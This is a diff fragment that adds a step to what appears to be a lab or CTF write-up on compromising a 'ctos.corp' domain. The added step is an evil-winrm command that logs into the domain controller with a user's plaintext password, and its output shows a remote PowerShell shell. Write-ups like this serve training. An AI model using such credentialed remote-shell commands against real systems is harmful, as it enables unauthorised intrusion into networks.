@@ -1291,6 +1291,19 @@ SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\john:H4x00r123
 As seen here i am now an Admin on the domain controller
 
 ```python
+evil-winrm -i dc01.ctos.corp -u john -p 'H4x00r123..'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\john\Documents>
+```
+
+```python
 
 ```
 
